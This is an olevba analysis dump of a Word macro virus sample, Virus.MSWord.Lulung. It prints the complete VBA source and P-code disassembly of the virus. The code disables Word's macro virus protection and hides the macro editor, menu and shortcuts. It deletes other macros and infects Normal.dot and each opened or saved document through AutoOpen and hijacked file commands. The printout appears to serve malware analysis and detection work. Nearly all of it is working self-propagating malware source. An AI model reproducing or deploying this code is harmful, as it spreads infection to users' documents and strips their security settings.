olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lulung
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ChenLung 
in file: Virus.MSWord.Lulung - OLE stream: 'ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






























Private Sub Image1_Click()
MsgBox "Don't Take My Food ! If You Want It, Ask To Your Mom !", vbOKOnly, "June 08, 1971"
End Sub

Private Sub Image2_Click()
MsgBox "Hei... Don't Click This Area !", vbOKOnly, "June 08, 1971"
End Sub

Private Sub OK_Click()
If Day(Now()) = 8 And Month(Now()) = 6 Then Call Jalan
Unload Me
End Sub

Sub Jalan()
Unload Me
umur = Year(Now()) - 1971
gua$ = "Today Is My Birthday... I'm Now " & umur & " Years Old. Thank's For Your Greeting !" & Chr$(13) & "© April, 1998 - By. June 08, 1971"
MsgBox gua$, vbOKOnly, "Happy Birthday To Me !"
StatusBar = "=> HAPPY Birthday to Me !"
End Sub
-------------------------------------------------------------------------------
VBA MACRO LungChen 
in file: Virus.MSWord.Lulung - OLE stream: 'LungChen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Welcome To My Listing Program !
'Created and Programmed By. June 8, 1971
'©April, 1998 - Ciputat
'Sorry, If my program disturbs you !
'It's not danger, I just want to be your friend !

Public Mulai
Public SimpanFile
Public Ay
Public Sun
Sub AyAlways()
    Mulai = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Cek
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub AyClose()
Application.DisplayAlerts = Mulai
End Sub
Sub AyBirthday()
If Day(Now()) = 8 And Month(Now()) = 6 Then ChenLung.Show
If Day(Now()) = 26 And Month(Now()) = 7 Then MsgBox "Today Is My Wife's Birthday. Happy Birthday Honey !", vbOKOnly, "Happy Birthday To My Wife"
If Day(Now()) = 8 And Month(Now()) = 2 Then MsgBox "Today Is My Wedding's Day. Thank's God !", vbOKOnly, "Happy Wedding"
End Sub
Sub Ay2()
    Call Cek
    On Error GoTo AyErr1
    Ay = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Error1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Ay = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error1a:
    If Ay = False Then
      On Error GoTo Error1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Error1:
    End If
AyErr1:
End Sub
Sub Ay2Doc()
    On Error GoTo AyErr2
    SimpanFile = 0
    Sun = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Error2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error2a:
    If Sun = False Then
      On Error GoTo Error2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      SimpanFile = 1
Error2:
    End If
AyErr2:
End Sub
Sub Lulung()
    Call AyAlways
    Call Ay2
    Call AyClose
End Sub
Sub Cek()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Error4
Set AD = ActiveDocument
    If SimpanFile = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Error4:
End Sub
Sub AutoOpen()
    Call AyBirthday
    Call Lulung
End Sub
Sub FileClose()
    On Error Resume Next
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    Call AyBirthday
    WordBasic.FileClose
    Documents.Add
End Sub
Sub FileOpen()
    On Error Resume Next
    Call Lulung
    Dialogs(wdDialogFileOpen).Show
    Call AyAlways
    Call Ay2Doc
    Call Simpan
    Call AyClose
    Call AyBirthday
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    Dialogs(wdDialogFileSaveAs).Show
    Call AyBirthday
End Sub
Sub FileSave()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call AyBirthday
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo AyErr3
    ChenLung.Show
AyErr3:
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Lulung
    ChenLung.Show
End Sub
Sub FileNew()
    On Error Resume Next
    Call Lulung
    Dialogs(wdDialogFileNew).Show
    Call AyBirthday
End Sub
Sub FileExit()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    On Error GoTo AyErr4
    Call AyBirthday
AyErr4:
    Call AyClose
    WordBasic.FileExit
End Sub
Sub FileTemplates()
    Call Lulung
    ChenLung.Show
End Sub
Sub ToolsCustomizeKeyboard()
    Call Lulung
    ChenLung.Show
End Sub
Sub ViewVBCode()
    Call Lulung
    ChenLung.Show
End Sub
Sub Organizer()
    ChenLung.Show
End Sub
Sub ToolsMacro()
    Call Lulung
    ChenLung.Show
End Sub
Sub ToolsCustomize()
    Call Lulung
    ChenLung.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Lulung - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Lulung
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/LungChen - 9836 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001F "Welcome To My Listing Program !"
' Line #1:
' 	QuoteRem 0x0000 0x0027 "Created and Programmed By. June 8, 1971"
' Line #2:
' 	QuoteRem 0x0000 0x0016 "©April, 1998 - Ciputat"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "Sorry, If my program disturbs you !"
' Line #4:
' 	QuoteRem 0x0000 0x0030 "It's not danger, I just want to be your friend !"
' Line #5:
' Line #6:
' 	Dim (Public) 
' 	VarDefn Mulai
' Line #7:
' 	Dim (Public) 
' 	VarDefn SimpanFile
' Line #8:
' 	Dim (Public) 
' 	VarDefn Ay
' Line #9:
' 	Dim (Public) 
' 	VarDefn Sun
' Line #10:
' 	FuncDefn (Sub AyAlways())
' Line #11:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St Mulai 
' Line #12:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #13:
' 	ArgsCall (Call) Cek 0x0000 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #17:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #18:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #22:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #23:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #24:
' 	OnError (GoTo 0) 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub AyClose())
' Line #27:
' 	Ld Mulai 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub AyBirthday())
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #31:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0033 "Today Is My Wife's Birthday. Happy Birthday Honey !"
' 	Ld vbOKOnly 
' 	LitStr 0x0019 "Happy Birthday To My Wife"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #32:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0028 "Today Is My Wedding's Day. Thank's God !"
' 	Ld vbOKOnly 
' 	LitStr 0x000D "Happy Wedding"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub Ay2())
' Line #35:
' 	ArgsCall (Call) Cek 0x0000 
' Line #36:
' 	OnError AyErr1 
' Line #37:
' 	LitVarSpecial (False)
' 	St Ay 
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #39:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #40:
' 	OnError Error1a 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #43:
' 	Ld NMacr 
' 	LitStr 0x0008 "LungChen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ay 
' 	EndIf 
' Line #44:
' 	Ld NMacr 
' 	LitStr 0x0008 "LungChen"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0008 "ChenLung"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #45:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Label Error1a 
' Line #49:
' 	Ld Ay 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #50:
' 	OnError Error1 
' Line #51:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "LungChen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #52:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "ChenLung"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #53:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	Label Error1 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Label AyErr1 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub Ay2Doc())
' Line #59:
' 	OnError AyErr2 
' Line #60:
' 	LitDI2 0x0000 
' 	St SimpanFile 
' Line #61:
' 	LitVarSpecial (False)
' 	St Sun 
' Line #62:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #63:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #64:
' 	OnError Error2a 
' Line #65:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #66:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #67:
' 	Ld NMacr 
' 	LitStr 0x0008 "LungChen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Sun 
' 	EndIf 
' Line #68:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #69:
' 	Ld NMacr 
' 	LitStr 0x0008 "LungChen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Sun 
' 	EndIf 
' Line #70:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0008 "LungChen"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0008 "ChenLung"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #71:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	Label Error2a 
' Line #75:
' 	Ld Sun 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #76:
' 	OnError Error2 
' Line #77:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "LungChen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "ChenLung"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #79:
' 	LitDI2 0x0001 
' 	St SimpanFile 
' Line #80:
' 	Label Error2 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Label AyErr2 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub Lulung())
' Line #85:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #86:
' 	ArgsCall (Call) Ay2 0x0000 
' Line #87:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub Cek())
' Line #90:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #92:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #93:
' 	EndWith 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub Simpan())
' Line #96:
' 	OnError Error4 
' Line #97:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #98:
' 	Ld SimpanFile 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Label Error4 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub AutoOpen())
' Line #104:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #105:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub FileClose())
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #110:
' 	ArgsCall (Call) Ay2 0x0000 
' Line #111:
' 	ArgsCall (Call) Ay2Doc 0x0000 
' Line #112:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #113:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #114:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #115:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #116:
' 	EndSub 
' Line #117:
' 	FuncDefn (Sub FileOpen())
' Line #118:
' 	OnError (Resume Next) 
' Line #119:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #120:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #121:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #122:
' 	ArgsCall (Call) Ay2Doc 0x0000 
' Line #123:
' 	ArgsCall (Call) Simpan 0x0000 
' Line #124:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #125:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #126:
' 	EndSub 
' Line #127:
' 	FuncDefn (Sub FileSaveAs())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #130:
' 	ArgsCall (Call) Ay2 0x0000 
' Line #131:
' 	ArgsCall (Call) Ay2Doc 0x0000 
' Line #132:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #133:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #134:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub FileSave())
' Line #137:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #138:
' 	ArgsCall (Call) Ay2 0x0000 
' Line #139:
' 	ArgsCall (Call) Ay2Doc 0x0000 
' Line #140:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #141:
' 	OnError Errh1 
' Line #142:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #143:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #144:
' 	Label Errh1 
' Line #145:
' 	EndSub 
' Line #146:
' 	FuncDefn (Sub HelpAbout())
' Line #147:
' 	OnError AyErr3 
' Line #148:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	Label AyErr3 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub ToolsOptions())
' Line #152:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #153:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #154:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub FileNew())
' Line #157:
' 	OnError (Resume Next) 
' Line #158:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #159:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #160:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub FileExit())
' Line #163:
' 	ArgsCall (Call) AyAlways 0x0000 
' Line #164:
' 	ArgsCall (Call) Ay2 0x0000 
' Line #165:
' 	ArgsCall (Call) Ay2Doc 0x0000 
' Line #166:
' 	OnError AyErr4 
' Line #167:
' 	ArgsCall (Call) AyBirthday 0x0000 
' Line #168:
' 	Label AyErr4 
' Line #169:
' 	ArgsCall (Call) AyClose 0x0000 
' Line #170:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub FileTemplates())
' Line #173:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #174:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #177:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #178:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Sub ViewVBCode())
' Line #181:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #182:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #183:
' 	EndSub 
' Line #184:
' 	FuncDefn (Sub Organizer())
' Line #185:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Sub ToolsMacro())
' Line #188:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #189:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #190:
' 	EndSub 
' Line #191:
' 	FuncDefn (Sub ToolsCustomize())
' Line #192:
' 	ArgsCall (Call) Lulung 0x0000 
' Line #193:
' 	Ld ChenLung 
' 	ArgsMemCall Show 0x0000 
' Line #194:
' 	EndSub 
' Macros/VBA/ChenLung - 2946 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub Image1_Click())
' Line #31:
' 	LitStr 0x0036 "Don't Take My Food ! If You Want It, Ask To Your Mom !"
' 	Ld vbOKOnly 
' 	LitStr 0x000D "June 08, 1971"
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	EndSub 
' Line #33:
' Line #34:
' 	FuncDefn (Private Sub Image2_Click())
' Line #35:
' 	LitStr 0x001E "Hei... Don't Click This Area !"
' 	Ld vbOKOnly 
' 	LitStr 0x000D "June 08, 1971"
' 	ArgsCall MsgBox 0x0003 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Private Sub OK_Click())
' Line #39:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Jalan 0x0000 
' 	EndIf 
' Line #40:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Sub Jalan())
' Line #44:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #45:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07B3 
' 	Sub 
' 	St umur 
' Line #46:
' 	LitStr 0x0020 "Today Is My Birthday... I'm Now "
' 	Ld umur 
' 	Concat 
' 	LitStr 0x0027 " Years Old. Thank's For Your Greeting !"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0021 "© April, 1998 - By. June 08, 1971"
' 	Concat 
' 	St gua$ 
' Line #47:
' 	Ld gua$ 
' 	Ld vbOKOnly 
' 	LitStr 0x0016 "Happy Birthday To Me !"
' 	ArgsCall MsgBox 0x0003 
' Line #48:
' 	LitStr 0x0019 "=> HAPPY Birthday to Me !"
' 	St StatusBar 
' Line #49:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OkeyN	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Lulung' - OLE stream: 'Macros/ChenLung/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?�������������������������(
-------------------------------------------------------------------------------
